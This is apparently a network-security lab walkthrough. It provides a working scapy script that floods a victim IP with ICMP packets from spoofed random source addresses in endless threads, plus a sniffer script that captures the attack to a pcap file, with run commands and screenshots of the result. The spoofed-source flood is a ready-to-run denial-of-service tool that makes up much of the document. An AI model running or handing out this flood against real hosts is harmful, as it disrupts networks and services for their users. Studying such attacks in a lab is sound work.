- Create a scapy code attack.py in the attacker machine

```
#!/usr/bin/env python

import sys
import threading

from scapy.all import *

if len(sys.argv) < 3:
  print(f"sudo {sys.argv[0]} <victim IP> <random IPs for source seperated by SPACE>")
  sys.exit(1)

dstIP = sys.argv[1]
srcIPs = sys.argv[2:]
while True:
  for srcIP in srcIPs:
    threading.Thread(
      target=send,
      args=(
        IP(src=srcIP, dst=dstIP) / ICMP(),
      ),
      kwargs={
        "count": 100
      }
    ).start()
```

- Create a victim.py file to sniff the attack from the attacker
  
```
#!/usr/bin/env python3

import signal
import sys

if len(sys.argv) != 2:
  print("sudo {} <pcap file name to save>".format(sys.argv[0]))
  sys.exit(1)

pktfilename = sys.argv[1]

try:
  from scapy.all import *
except ImportError:
  import os
  os.system("pip install scapy==2.5.0 matplotlib==3.8.2 pyx==0.16 vpython==7.6.4 cryptography==42.0.2")
  sys.exit(1)


def abrt_sig_hndler(sig, frame):
  print(sig)
  print(frame)
  print("Pressed Ctrl C")
  pkts = sniffer.stop()
  # pkts.summary()
  wrpcap(pktfilename, pkts, append=True)
  sys.exit(0)

signal.signal(signal.SIGINT, abrt_sig_hndler)

sniffer = AsyncSniffer()
sniffer.start()
sniffer.join()
```

- Run the victim.py and the following pcap file in which you want to save the sniffed packets

``` sudo python3 victim.py victim.pcap ```

![image](https://github.com/udayk01/Network-Security/assets/52235763/90d9cca3-f986-49af-9845-461b76070a4d)

- Then run the attacker code in the attacker machine , with victim ip followed by some random ips

``` sudo python3 attack.py "victim ip" "random ip" "random ip" "random ip"```

  ![image](https://github.com/udayk01/Network-Security/assets/52235763/526eeb7f-2ba3-4e7e-a419-957f6e97b0b9)

We can see the packets being sent

![image](https://github.com/udayk01/Network-Security/assets/52235763/55c24dff-bdef-4d24-9967-4c2098a4e069)

After that end the victim.py program, and we can see that the pcap file is saved.

![image](https://github.com/udayk01/Network-Security/assets/52235763/8d75bf9a-6d7d-4b81-b80f-d69e2c6c1cb5)

Open and explore the victim.pcap and we can see the attack happening

![image](https://github.com/udayk01/Network-Security/assets/52235763/af97804c-0e57-4deb-8a0a-e2e0ba551e6e)


  
